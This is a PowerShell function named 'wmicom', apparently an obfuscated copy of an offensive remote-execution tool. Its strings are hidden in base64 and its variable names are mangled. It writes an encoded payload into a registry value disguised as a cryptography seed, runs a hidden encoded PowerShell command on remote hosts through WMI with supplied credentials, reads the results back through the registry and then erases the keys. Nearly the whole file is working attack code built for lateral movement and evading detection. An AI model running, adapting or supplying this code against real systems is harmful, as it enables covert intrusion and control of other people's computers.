function wmicom {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingWMICmdlet', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingInvokeExpression', '')]
    [CmdletBinding()]
    Param (
        [Parameter( Mandatory = $True )]
        [ScriptBlock]
        $Payload,

        [String]
        [ValidateSet( 'HKEY_LOCAL_MACHINE',
                      'HKEY_CURRENT_USER',
                      'HKEY_CLASSES_ROOT',
                      'HKEY_USERS',
                      'HKEY_CURRENT_CONFIG' )]
        $RegistryHive = 'HKEY_CURRENT_USER',

        [String]
        [ValidateNotNullOrEmpty()]
        $RegistryKeyPath = 'SOFTWARE\Microsoft\Cryptography\RNG',

        [String]
        [ValidateNotNullOrEmpty()]
        $RegistryPayloadValueName = 'Seed',

        [String]
        [ValidateNotNullOrEmpty()]
        $RegistryResultValueName = 'Value',

        [Parameter( ValueFromPipeline = $True )]
        [Alias('Cn')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Management.ImpersonationLevel]
        $Impersonation,

        [System.Management.AuthenticationLevel]
        $Authentication,

        [Switch]
        $EnableAllPrivileges,

        [String]
        $Authority
    )

    BEGIN {
        switch ($RegistryHive) {
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUA'))) { ${/==\_/\/\_____/=\} = 2147483650 }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEUAWQBfAEMAVQBSAFIARQBOAFQAXwBVAFMARQBSAA=='))) { ${/==\_/\/\_____/=\} = 2147483649 }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEUAWQBfAEMATABBAFMAUwBFAFMAXwBSAE8ATwBUAA=='))) { ${/==\_/\/\_____/=\} = 2147483648 }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEUAWQBfAFUAUwBFAFIAUwA='))) { ${/==\_/\/\_____/=\} = 2147483651 }
            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEUAWQBfAEMAVQBSAFIARQBOAFQAXwBDAE8ATgBGAEkARwA='))) { ${/==\_/\/\_____/=\} = 2147483653 }
        }

        ${_/==\/==\__/=\/\/} = 2147483650

        ${_/\_/==\/\/=\/\/\} = @{}

        
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\_/==\/\/=\/\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgA=')))]) { ${_/\_/==\/\/=\/\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgA=')))] = $Impersonation }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAA==')))]) { ${_/\_/==\/\/=\/\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAA==')))] = $Authentication }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAGEAYgBsAGUAQQBsAGwAUAByAGkAdgBpAGwAZQBnAGUAcwA=')))]) { ${_/\_/==\/\/=\/\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAGEAYgBsAGUAQQBsAGwAUAByAGkAdgBpAGwAZQBnAGUAcwA=')))] = $EnableAllPrivileges }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIAaQB0AHkA')))]) { ${_/\_/==\/\/=\/\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIAaQB0AHkA')))] = $Authority }

        ${/=\/\/==\__/\_/=\} = @{
            KEY_QUERY_VALUE = 1
            KEY_SET_VALUE = 2
            KEY_CREATE_SUB_KEY = 4
            KEY_CREATE = 32
            DELETE = 65536
        }

        
        ${_/\__/\/=\__/\/==} = ${/=\/\/==\__/\_/=\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBFAFkAXwBRAFUARQBSAFkAXwBWAEEATABVAEUA')))] -bor
                               ${/=\/\/==\__/\_/=\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBFAFkAXwBTAEUAVABfAFYAQQBMAFUARQA=')))] -bor
                               ${/=\/\/==\__/\_/=\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBFAFkAXwBDAFIARQBBAFQARQBfAFMAVQBCAF8ASwBFAFkA')))] -bor
                               ${/=\/\/==\__/\_/=\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBFAFkAXwBDAFIARQBBAFQARQA=')))] -bor
                               ${/=\/\/==\__/\_/=\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABFAEwARQBUAEUA')))]
    }

    PROCESS {
        foreach (${_/=====\/===\/==\} in $ComputerName) {
            
            ${_/\_/==\/\/=\/\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))] = ${_/=====\/===\/==\}

            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAkAHsAXwAvAD0APQA9AD0APQBcAC8APQA9AD0AXAAvAD0APQBcAH0AXQAgAEMAcgBlAGEAdABpAG4AZwAgAHQAaABlACAAZgBvAGwAbABvAHcAaQBuAGcAIAByAGUAZwBpAHMAdAByAHkAIABrAGUAeQA6ACAAJABSAGUAZwBpAHMAdAByAHkASABpAHYAZQBcACQAUgBlAGcAaQBzAHQAcgB5AEsAZQB5AFAAYQB0AGgA')))
            ${__/=\____/===\_/=} = Invoke-WmiMethod @_/\_/==\/\/=\/\/\ -Namespace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA'))) -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUASwBlAHkA'))) -ArgumentList ${/==\_/\/\_____/=\}, $RegistryKeyPath

            if (${__/=\____/===\_/=}.ReturnValue -ne 0) {
                throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAkAHsAXwAvAD0APQA9AD0APQBcAC8APQA9AD0AXAAvAD0APQBcAH0AXQAgAFUAbgBhAGIAbABlACAAdABvACAAYwByAGUAYQB0AGUAIAB0AGgAZQAgAGYAbwBsAGwAbwB3AGkAbgBnACAAcgBlAGcAaQBzAHQAcgB5ACAAawBlAHkAOgAgACQAUgBlAGcAaQBzAHQAcgB5AEgAaQB2AGUAXAAkAFIAZQBnAGkAcwB0AHIAeQBLAGUAeQBQAGEAdABoAA==')))
            }

            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAkAHsAXwAvAD0APQA9AD0APQBcAC8APQA9AD0AXAAvAD0APQBcAH0AXQAgAFYAYQBsAGkAZABhAHQAaQBuAGcAIAByAGUAYQBkAC8AdwByAGkAdABlAC8AZABlAGwAZQB0AGUAIABwAHIAaQB2AGkAbABlAGcAZQBzACAAZgBvAHIAIAB0AGgAZQAgAGYAbwBsAGwAbwB3AGkAbgBnACAAcgBlAGcAaQBzAHQAcgB5ACAAawBlAHkAOgAgACQAUgBlAGcAaQBzAHQAcgB5AEgAaQB2AGUAXAAkAFIAZQBnAGkAcwB0AHIAeQBLAGUAeQBQAGEAdABoAA==')))
            ${__/=\____/===\_/=} = Invoke-WmiMethod @_/\_/==\/\/=\/\/\ -Namespace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA'))) -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAEEAYwBjAGUAcwBzAA=='))) -ArgumentList ${/==\_/\/\_____/=\}, $RegistryKeyPath, ${_/\__/\/=\__/\/==}

            if (-not ${__/=\____/===\_/=}.bGranted) {
                throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAkAHsAXwAvAD0APQA9AD0APQBcAC8APQA9AD0AXAAvAD0APQBcAH0AXQAgAFkAbwB1ACAAZABvACAAbgBvAHQAIABoAGEAdgBlACAAcABlAHIAbQBpAHMAcwBpAG8AbgAgAHQAbwAgAHAAZQByAGYAbwByAG0AIABhAGwAbAAgAHQAaABlACAAcgBlAGcAaQBzAHQAcgB5ACAAbwBwAGUAcgBhAHQAaQBvAG4AcwAgAG4AZQBjAGUAcwBzAGEAcgB5ACAAZgBvAHIAIABJAG4AdgBvAGsAZQAtAFcAbQBpAEMAbwBtAG0AYQBuAGQALgA=')))
            }

            ${_/\_/==\_/=====\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAMQBcAFMAaABlAGwAbABJAGQAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AC4AUABvAHcAZQByAFMAaABlAGwAbAA=')))
            ${____/==\/======\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA=')))

            ${__/=\____/===\_/=} = Invoke-WmiMethod @_/\_/==\/\/=\/\/\ -Namespace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA'))) -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUwB0AHIAaQBuAGcAVgBhAGwAdQBlAA=='))) -ArgumentList ${_/==\/==\__/=\/\/}, ${_/\_/==\_/=====\/}, ${____/==\/======\/}

            if (${__/=\____/===\_/=}.ReturnValue -ne 0) {
                throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAkAHsAXwAvAD0APQA9AD0APQBcAC8APQA9AD0AXAAvAD0APQBcAH0AXQAgAFUAbgBhAGIAbABlACAAdABvACAAbwBiAHQAYQBpAG4AIABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIABwAGEAdABoACAAZgByAG8AbQAgAHQAaABlACAAZgBvAGwAbABvAHcAaQBuAGcAIAByAGUAZwBpAHMAdAByAHkAIAB2AGEAbAB1AGUAOgAgAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAJAB7AF8ALwBcAF8ALwA9AD0AXABfAC8APQA9AD0APQA9AFwALwB9AFwAJAB7AF8AXwBfAF8ALwA9AD0AXAAvAD0APQA9AD0APQA9AFwALwB9AA==')))
            }

            ${/===\_/\/\/=\____} = ${__/=\____/===\_/=}.sValue
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAkAHsAXwAvAD0APQA9AD0APQBcAC8APQA9AD0AXAAvAD0APQBcAH0AXQAgAEYAdQBsAGwAIABQAG8AdwBlAHIAUwBoAGUAbABsACAAcABhAHQAaAA6ACAAJAB7AC8APQA9AD0AXABfAC8AXAAvAFwALwA9AFwAXwBfAF8AXwB9AA==')))

            ${/=\/==\/==\/==\__} = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Payload))

            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAkAHsAXwAvAD0APQA9AD0APQBcAC8APQA9AD0AXAAvAD0APQBcAH0AXQAgAFMAdABvAHIAaQBuAGcAIAB0AGgAZQAgAHAAYQB5AGwAbwBhAGQAIABpAG4AdABvACAAdABoAGUAIABmAG8AbABsAG8AdwBpAG4AZwAgAHIAZQBnAGkAcwB0AHIAeQAgAHYAYQBsAHUAZQA6ACAAJABSAGUAZwBpAHMAdAByAHkASABpAHYAZQBcACQAUgBlAGcAaQBzAHQAcgB5AEsAZQB5AFAAYQB0AGgAXAAkAFIAZQBnAGkAcwB0AHIAeQBQAGEAeQBsAG8AYQBkAFYAYQBsAHUAZQBOAGEAbQBlAA==')))
            ${__/=\____/===\_/=} = Invoke-WmiMethod @_/\_/==\/\/=\/\/\ -Namespace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA'))) -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQAUwB0AHIAaQBuAGcAVgBhAGwAdQBlAA=='))) -ArgumentList ${/==\_/\/\_____/=\}, $RegistryKeyPath, ${/=\/==\/==\/==\__}, $RegistryPayloadValueName

            if (${__/=\____/===\_/=}.ReturnValue -ne 0) {
                throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAkAHsAXwAvAD0APQA9AD0APQBcAC8APQA9AD0AXAAvAD0APQBcAH0AXQAgAFUAbgBhAGIAbABlACAAdABvACAAcwB0AG8AcgBlACAAdABoAGUAIABwAGEAeQBsAG8AYQBkACAAaQBuACAAdABoAGUAIABmAG8AbABsAG8AdwBpAG4AZwAgAHIAZQBnAGkAcwB0AHIAeQAgAHYAYQBsAHUAZQA6ACAAJABSAGUAZwBpAHMAdAByAHkASABpAHYAZQBcACQAUgBlAGcAaQBzAHQAcgB5AEsAZQB5AFAAYQB0AGgAXAAkAFIAZQBnAGkAcwB0AHIAeQBQAGEAeQBsAG8AYQBkAFYAYQBsAHUAZQBOAGEAbQBlAA==')))
            }

            
            ${/=\/\/\_/==\_/\_/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAEgAaQB2AGUAIAA9ACAAJwAkAHsALwA9AD0AXABfAC8AXAAvAFwAXwBfAF8AXwBfAC8APQBcAH0AJwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAFIAZQBnAGkAcwB0AHIAeQBLAGUAeQBQAGEAdABoACAAPQAgACcAJABSAGUAZwBpAHMAdAByAHkASwBlAHkAUABhAHQAaAAnAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAUgBlAGcAaQBzAHQAcgB5AFAAYQB5AGwAbwBhAGQAVgBhAGwAdQBlAE4AYQBtAGUAIAA9ACAAJwAkAFIAZQBnAGkAcwB0AHIAeQBQAGEAeQBsAG8AYQBkAFYAYQBsAHUAZQBOAGEAbQBlACcADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABSAGUAZwBpAHMAdAByAHkAUgBlAHMAdQBsAHQAVgBhAGwAdQBlAE4AYQBtAGUAIAA9ACAAJwAkAFIAZQBnAGkAcwB0AHIAeQBSAGUAcwB1AGwAdABWAGEAbAB1AGUATgBhAG0AZQAnAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAAoA')))

            ${/==\/\/\/\__/\_/\} = ${/=\/\/\_/==\_/\_/} + {
                ${_/\_/==\/\/=\/\/\} = @{
                    Namespace = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA')))
                    Class = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA=')))
                }

                ${__/=\____/===\_/=} = Invoke-WmiMethod @_/\_/==\/\/=\/\/\ -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUwB0AHIAaQBuAGcAVgBhAGwAdQBlAA=='))) -ArgumentList ${/==\_/\/\_____/=\}, $RegistryKeyPath, $RegistryPayloadValueName

                if ((${__/=\____/===\_/=}.ReturnValue -eq 0) -and (${__/=\____/===\_/=}.sValue)) {
                    $Payload = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(${__/=\____/===\_/=}.sValue))

                    ${_/=\__/===\__/\_/} = [IO.Path]::GetTempFileName()

                    ${_/=\/====\__/\/\/} = iex ($Payload)

                    Export-Clixml -InputObject ${_/=\/====\__/\/\/} -Path ${_/=\__/===\__/\_/}

                    ${/\____/===\__/\/=} = [IO.File]::ReadAllText(${_/=\__/===\__/\_/})

                    $null = Invoke-WmiMethod @_/\_/==\/\/=\/\/\ -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQAUwB0AHIAaQBuAGcAVgBhAGwAdQBlAA=='))) -ArgumentList ${/==\_/\/\_____/=\}, $RegistryKeyPath, ${/\____/===\__/\/=}, $RegistryResultValueName

                    rd -Path ${/===\/\_/\_/=\___} -Force

                    $null = Invoke-WmiMethod @_/\_/==\/\/=\/\/\ -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUAVgBhAGwAdQBlAA=='))) -ArgumentList ${/==\_/\/\_____/=\}, $RegistryKeyPath, $RegistryPayloadValueName
                }
            }

            ${_/=====\_____/\__} = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(${/==\/\/\/\__/\_/\}))

            ${_/\_/=\/=\_/\/=\/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQA9AD0AXABfAC8AXAAvAFwALwA9AFwAXwBfAF8AXwB9ACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgAC0ATgBvAFAAcgBvAGYAaQBsAGUAIAAtAEUAbgBjAG8AZABlAGQAQwBvAG0AbQBhAG4AZAAgACQAewBfAC8APQA9AD0APQA9AFwAXwBfAF8AXwBfAC8AXABfAF8AfQA=')))

            
            ${__/=\____/===\_/=} = Invoke-WmiMethod @_/\_/==\/\/=\/\/\ -Namespace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAG8AdABcAGMAaQBtAHYAMgA='))) -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAF8AUAByAG8AYwBlAHMAcwA='))) -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUA'))) -ArgumentList ${_/\_/=\/=\_/\/=\/}

            sleep -Seconds 5

            if (${__/=\____/===\_/=}.ReturnValue -ne 0) {
                throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAkAHsAXwAvAD0APQA9AD0APQBcAC8APQA9AD0AXAAvAD0APQBcAH0AXQAgAFUAbgBhAGIAbABlACAAdABvACAAZQB4AGUAYwB1AHQAZQAgAHAAYQB5AGwAbwBhAGQAIABzAHQAbwByAGUAZAAgAHcAaQB0AGgAaQBuACAAdABoAGUAIABmAG8AbABsAG8AdwBpAG4AZwAgAHIAZQBnAGkAcwB0AHIAeQAgAHYAYQBsAHUAZQA6ACAAJABSAGUAZwBpAHMAdAByAHkASABpAHYAZQBcACQAUgBlAGcAaQBzAHQAcgB5AEsAZQB5AFAAYQB0AGgAXAAkAFIAZQBnAGkAcwB0AHIAeQBQAGEAeQBsAG8AYQBkAFYAYQBsAHUAZQBOAGEAbQBlAA==')))
            }

            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAkAHsAXwAvAD0APQA9AD0APQBcAC8APQA9AD0AXAAvAD0APQBcAH0AXQAgAFAAYQB5AGwAbwBhAGQAIABzAHUAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAGUAeABlAGMAdQB0AGUAZAAgAGYAcgBvAG0AOgAgACQAUgBlAGcAaQBzAHQAcgB5AEgAaQB2AGUAXAAkAFIAZQBnAGkAcwB0AHIAeQBLAGUAeQBQAGEAdABoAFwAJABSAGUAZwBpAHMAdAByAHkAUABhAHkAbABvAGEAZABWAGEAbAB1AGUATgBhAG0AZQA=')))

            ${__/=\____/===\_/=} = Invoke-WmiMethod @_/\_/==\/\/=\/\/\ -Namespace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA'))) -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUwB0AHIAaQBuAGcAVgBhAGwAdQBlAA=='))) -ArgumentList ${/==\_/\/\_____/=\}, $RegistryKeyPath, $RegistryResultValueName

            if (${__/=\____/===\_/=}.ReturnValue -ne 0) {
                throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAkAHsAXwAvAD0APQA9AD0APQBcAC8APQA9AD0AXAAvAD0APQBcAH0AXQAgAFUAbgBhAGIAbABlACAAcgBlAHQAcgBpAGUAdgBlACAAdABoAGUAIABwAGEAeQBsAG8AYQBkACAAcgBlAHMAdQBsAHQAcwAgAGYAcgBvAG0AIAB0AGgAZQAgAGYAbwBsAGwAbwB3AGkAbgBnACAAcgBlAGcAaQBzAHQAcgB5ACAAdgBhAGwAdQBlADoAIAAkAFIAZQBnAGkAcwB0AHIAeQBIAGkAdgBlAFwAJABSAGUAZwBpAHMAdAByAHkASwBlAHkAUABhAHQAaABcACQAUgBlAGcAaQBzAHQAcgB5AFIAZQBzAHUAbAB0AFYAYQBsAHUAZQBOAGEAbQBlAA==')))
            }

            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAkAHsAXwAvAD0APQA9AD0APQBcAC8APQA9AD0AXAAvAD0APQBcAH0AXQAgAFAAYQB5AGwAbwBhAGQAIAByAGUAcwB1AGwAdABzACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkAIAByAGUAdAByAGkAZQB2AGUAZAAgAGYAcgBvAG0AOgAgACQAUgBlAGcAaQBzAHQAcgB5AEgAaQB2AGUAXAAkAFIAZQBnAGkAcwB0AHIAeQBLAGUAeQBQAGEAdABoAFwAJABSAGUAZwBpAHMAdAByAHkAUgBlAHMAdQBsAHQAVgBhAGwAdQBlAE4AYQBtAGUA')))

            ${/===\/\_/\_/=\___} = ${__/=\____/===\_/=}.sValue

            ${_/=\__/===\__/\_/} = [IO.Path]::GetTempFileName()

            Out-File -InputObject ${/===\/\_/\_/=\___} -FilePath ${_/=\__/===\__/\_/}
            ${_/=\/====\__/\/\/} = Import-Clixml -Path ${_/=\__/===\__/\_/}

            rd -Path ${_/=\__/===\__/\_/}

            ${___/===\_/\_/\_/\} = New-Object PSObject -Property @{
                PSComputerName = ${_/=====\/===\/==\}
                PayloadOutput = ${_/=\/====\__/\/\/}
            }

            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAkAHsAXwAvAD0APQA9AD0APQBcAC8APQA9AD0AXAAvAD0APQBcAH0AXQAgAFIAZQBtAG8AdgBpAG4AZwAgAHQAaABlACAAZgBvAGwAbABvAHcAaQBuAGcAIAByAGUAZwBpAHMAdAByAHkAIAB2AGEAbAB1AGUAOgAgACQAUgBlAGcAaQBzAHQAcgB5AEgAaQB2AGUAXAAkAFIAZQBnAGkAcwB0AHIAeQBLAGUAeQBQAGEAdABoAFwAJABSAGUAZwBpAHMAdAByAHkAUgBlAHMAdQBsAHQAVgBhAGwAdQBlAE4AYQBtAGUA')))
            $null = Invoke-WmiMethod @_/\_/==\/\/=\/\/\ -Namespace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA'))) -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUAVgBhAGwAdQBlAA=='))) -ArgumentList ${/==\_/\/\_____/=\}, $RegistryKeyPath, $RegistryResultValueName

            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAkAHsAXwAvAD0APQA9AD0APQBcAC8APQA9AD0AXAAvAD0APQBcAH0AXQAgAFIAZQBtAG8AdgBpAG4AZwAgAHQAaABlACAAZgBvAGwAbABvAHcAaQBuAGcAIAByAGUAZwBpAHMAdAByAHkAIABrAGUAeQA6ACAAJABSAGUAZwBpAHMAdAByAHkASABpAHYAZQBcACQAUgBlAGcAaQBzAHQAcgB5AEsAZQB5AFAAYQB0AGgA')))
            $null = Invoke-WmiMethod @_/\_/==\/\/=\/\/\ -Namespace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA'))) -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUASwBlAHkA'))) -ArgumentList ${/==\_/\/\_____/=\}, $RegistryKeyPath

            return ${___/===\_/\_/\_/\}
        }
    }
}
